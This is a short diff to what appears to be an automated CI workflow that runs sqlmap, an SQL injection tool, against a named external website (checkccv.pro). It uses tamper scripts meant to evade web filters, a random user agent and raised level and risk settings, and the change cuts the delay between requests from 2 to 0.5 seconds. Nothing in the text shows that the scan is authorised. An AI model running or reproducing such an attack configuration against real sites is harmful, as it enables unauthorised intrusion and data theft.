@@ -26,7 +26,7 @@ jobs:
         python3 sqlmap.py -u "https://checkccv.pro/?action=home&category=5" \
           --random-agent \
           --tamper=space2comment,between,charencode,randomcase,versionedmorekeywords \
-          --delay=2 \
+          --delay=0.5 \
           --threads=1 \
           --level=3 \
           --risk=2 \
